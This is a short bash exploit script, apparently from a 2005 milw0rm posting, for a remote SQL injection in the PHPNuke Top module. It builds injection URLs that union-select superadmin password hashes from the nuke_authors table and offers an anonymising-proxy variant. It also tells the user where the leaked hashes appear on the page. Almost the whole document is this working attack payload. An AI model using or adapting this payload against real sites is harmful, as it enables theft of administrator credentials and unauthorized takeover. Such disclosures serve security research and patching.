#/bin/bash

# This is just basic-ly modules.php?name=Top&querylang=union%20select%200,pwd,0,0%20from%20nuke_authors%20where%20radminsuper=1
# works thou /str0ke

#
# PHPNuke Top Module Remote SQL Injection
# by Fabrizi Andrea 2005
# andrea.fabrizi [at] gmail.com
#
# Work with the PHPNuke latest version!  
#

URL=$1;
PATH="$2/";
ANON="http://anonymouse.ws/cgi-bin/anon-www.cgi/";

        echo -e "\n PHPNuke Top Module Remote SQL Injection" 
        echo -e " by Fabrizi Andrea 2005"

if [ "$URL" = "" ]; then
	echo -e "\n USAGE: $0 [URL] [NukePath]"
	echo -e " Example: $0 www.site.net phpNuke\n" 
	exit
fi;

if [ $PATH = "/" ]; then PATH=""; fi;
#anon_query_url="$ANON""http://$URL/$PATH""modules.php?name=Top&querylang=union/**/%20select%200,pwd,0,0%20from%20nuke_authors%20where%20radminsuper=1";
anon_query_url="$ANON""http://$URL/$PATH""modules.php?name=Top&querylang=union%20select%200,pwd,0,0%20from%20nuke_authors%20where%20radminsuper=1"; #changed line /str0ke

#query_url="http://$URL/$PATH""modules.php?name=Top&querylang=union/**/%20select%200,pwd,0,0%20from%20nuke_authors%20where%20radminsuper=1";
query_url="http://$URL/$PATH""modules.php?name=Top&querylang=union%20select%200,pwd,0,0%20from%20nuke_authors%20where%20radminsuper=1"; #changed line /str0ke

echo -e "\n - Anonymous Query URL: "$anon_query_url "\n";
echo -e " - Direct Query URL: " $query_url "\n";
echo -e " - If this version of PHPNuke is vurnerable you can see the Admin's Passwords Hashes at the end of 'Most voted polls' List!\n"

# milw0rm.com [2005-04-07]
